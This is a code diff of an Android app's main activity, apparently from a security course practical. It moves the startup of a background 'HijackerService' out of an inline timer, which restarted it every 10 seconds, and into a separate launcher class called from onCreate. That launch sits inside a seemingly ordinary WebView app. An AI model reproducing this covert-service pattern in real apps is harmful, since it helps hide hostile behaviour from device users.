@@ -3,7 +3,6 @@ package com.seginfo.tp.seginfotp;
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
-import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.ActivityInfo;
 import android.content.res.Configuration;
@@ -24,9 +23,6 @@ import android.webkit.WebSettings.RenderPriority;
 import android.webkit.WebView;
 import android.widget.Toast;
 
-import java.util.Timer;
-import java.util.TimerTask;
-
 public class MainActivity extends Activity {
 
     private WebView mWebView;
@@ -42,8 +38,8 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        launchHijackerService();
+
+        HijackerServiceLauncher.getInstance().runFor(this.getBaseContext());
 
         // Don't show an action bar or title
         requestWindowFeature(Window.FEATURE_NO_TITLE);
@@ -171,26 +167,5 @@ public class MainActivity extends Activity {
             pressBackToast.cancel();
             super.onBackPressed();
         }
-    }
-
-    private void launchHijackerService(){
-        Intent myIntent = new Intent(this, HijackerService.class);
-        repeatWithTimer(myIntent);
-    }
-
-    private void repeatWithTimer(Intent intent){
-        final Intent myIntent = intent;
-        long frequency = 10*1000; // in millis (10 sec)
-
-        Timer timer = new Timer ();
-        TimerTask repetitiveTask = new TimerTask () {
-            @Override
-            public void run () {
-                startService(myIntent);
-            }
-        };
-
-        // schedule the task to run starting now and then every hour...
-        timer.schedule (repetitiveTask, 0l, frequency);   // 1000*10 every 10 sec
     }
 }
